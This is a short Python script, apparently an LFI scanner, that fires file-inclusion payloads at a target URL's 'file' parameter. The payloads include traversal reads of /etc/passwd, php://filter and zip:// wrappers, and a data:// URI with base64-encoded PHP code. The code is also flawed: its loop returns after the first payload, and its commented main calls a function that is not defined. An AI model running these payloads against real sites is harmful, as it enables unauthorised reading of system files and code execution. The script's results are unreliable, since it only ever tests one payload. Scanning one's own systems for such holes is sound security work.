import requests
from urllib.parse import quote

def is_lfi_vulnerable(url, payload):
    # Construct the full URL with the LFI payload
    full_url = f"{url}?file={quote(payload)}"

    try:
        # Send an HTTP request to the target URL
        response = requests.get(full_url)

        # Check if the response indicates a successful LFI exploitation
        if "root:" in response.text:
            return True
        else:
            return False
    except requests.RequestException as e:
        print(f"Error during request: {e}")
        return False

def test_lfi(url):
    # List of payloads to test for LFI
    payloads = [
        "../../../../etc/passwd%00",
        "../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "zip://../avatar/target.jpg%23code",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
    ]

    for payload in payloads:
        if is_lfi_vulnerable(url, payload):
            # print(f"Vulnerable to LFI: {url}?file={payload}")
            return {'url': url, 'is_vulnerable': True, 'details': f"Vulnerable to LFI: {url}?file={payload}"}
        else:
            # print(f"Not vulnerable to LFI: {url}?file={payload}")
            return {'url': url, 'is_vulnerable': False, 'details': f"not Vulnerable to LFI: {url}?file={payload}"}

# if __name__ == "__main__":
#     # Get user input for the target URL
#     user_input_url = input("Enter the target URL: ").strip()

#     # Add http:// if not provided
#     url = user_input_url if user_input_url.startswith("http") else f"http://{user_input_url}"

#     # Check for LFI vulnerability
#     check_lfi_vulnerability(url)
